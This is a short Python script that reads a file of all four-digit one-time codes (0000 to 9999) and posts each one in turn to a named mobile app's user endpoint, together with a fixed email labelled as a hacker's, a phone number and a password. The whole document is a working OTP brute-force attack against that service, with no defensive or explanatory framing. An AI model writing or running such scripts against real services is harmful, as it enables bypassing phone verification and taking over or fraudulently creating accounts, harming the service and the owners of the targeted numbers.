import json
import requests
import string
import os

url = 'https://api.sportiv.app:11443/api/v1/mobile/user'

number = json.loads(open('otp_list_0000_9999').read())
for num in number:
    requests.post(url, allow_redirects=False, data={
        "email":"contoh@hacker.mike",
        "mobileNumber":"+6287878979879",
        "otpCode":num,
        "password":"1Duatiga"
    })